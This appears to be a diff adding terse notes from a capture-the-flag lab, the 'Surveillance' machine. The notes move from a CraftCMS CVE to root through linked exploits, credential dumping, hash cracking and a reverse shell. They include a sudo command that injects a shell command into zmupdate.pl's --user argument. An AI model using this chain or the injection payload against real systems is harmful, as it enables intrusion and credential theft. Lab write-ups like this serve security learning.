@@ -1,0 +1,114 @@
+surveillance
+
+	port 22 and 80 open
+
+	80 hosts a craftcms website
+
+	link on the bottom reveals the version is 4.4.14
+
+	it's vulnerable to to CVE-2023-41892
+
+	exploit available here https://gist.github.com/graypwn/d85aab1c945575a0622323ab30b4e30f
+
+	for whatever reason this exploit tries to proxy the request, remove the proxies= at line 35
+
+	got a shell as www-data
+
+	$ printenv
+	USER=www-data
+	HOME=/var/www
+	PWD=/var/www/html/craft/web/cpresources
+
+	$ sudo -l
+
+	$ ls /home
+	matthew
+	zoneminder
+
+	running linpeas:
+
+		.env:
+
+			-rw-r--r-- 1 www-data www-data 836 Oct 21 18:32 /var/www/html/craft/.env
+			CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7
+			CRAFT_ENVIRONMENT=production
+			CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_
+			CRAFT_DB_DRIVER=mysql
+			CRAFT_DB_SERVER=127.0.0.1
+			CRAFT_DB_PORT=3306
+			CRAFT_DB_DATABASE=craftdb
+			CRAFT_DB_USER=craftuser
+			CRAFT_DB_PASSWORD=CraftCMSPassword2023!
+			CRAFT_DB_SCHEMA=
+			CRAFT_DB_TABLE_PREFIX=
+			DEV_MODE=false
+			ALLOW_ADMIN_CHANGES=false
+			DISALLOW_ROBOTS=false
+			PRIMARY_SITE_URL=http://surveillance.htb/
+
+		php files:
+
+			╔══════════╣ Searching passwords in config PHP files
+			/usr/share/zoneminder/www/api/app/Config/database.php:          'password' => 'ZoneMinderPassword2023',
+			/usr/share/zoneminder/www/api/app/Config/database.php:          'password' => ZM_DB_PASS,
+			/usr/share/zoneminder/www/includes/config.php:  'Password'  => '',
+
+
+
+	mysqldump -u craftuser -pCraftCMSPassword2023! -h 127.0.0.1 craftdb > dump
+	python -m http.server
+
+	gets this bcrypt hash for user matthew
+	$2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe
+
+	john with rockyou gives password starcraft122490
+
+	nothing interesting in linpeas, but there's still unchecked port 8080 running zoneminder
+	forwarding port out with this script https://gist.github.com/ashen-cloud/532d894a5412716b416cded2c23147b5
+
+	googling zoneminder exploit: https://github.com/rvizx/CVE-2023-26035
+
+	matthew@surveillance:~$ nc -l localhost 7777
+	python3 exploit.py -t http://... -ip localhost -p 7777
+	gets the shell as user zoneminder
+
+	sudo -l
+	user zoneminder may run the following commands on surveillance:
+    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
+ 
+	zoneminder@surveillance:/usr/share/zoneminder/www$ find /usr/bin -iname "zm*.pl"
+	<share/zoneminder/www$ find /usr/bin -iname "zm*.pl"
+	/usr/bin/zmtrack.pl
+	/usr/bin/zmpkg.pl
+	/usr/bin/zmcontrol.pl
+	/usr/bin/zmonvif-probe.pl
+	/usr/bin/zmvideo.pl
+	/usr/bin/zmtelemetry.pl
+	/usr/bin/zmsystemctl.pl
+	/usr/bin/zmonvif-trigger.pl
+	/usr/bin/zmwatch.pl
+	/usr/bin/zmdc.pl
+	/usr/bin/zmstats.pl
+	/usr/bin/zmtrigger.pl
+	/usr/bin/zmx10.pl
+	/usr/bin/zmfilter.pl
+	/usr/bin/zmcamtool.pl
+	/usr/bin/zmaudit.pl
+	/usr/bin/zmupdate.pl
+	/usr/bin/zmrecover.pl
+
+	need to inject perl code into one of those files?
+
+	find ones that take args:
+		grep "\-\-" /usr/bin/zm*.pl
+
+	saving a perl shell to /tmp and starting a listener
+	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl
+
+	break into internal sql call command:
+	sudo /usr/bin/zmupdate.pl --user='$(perl /tmp/shell.pl)' --version=1
+
+	cat /root/root.txt
+
+	gg
+	
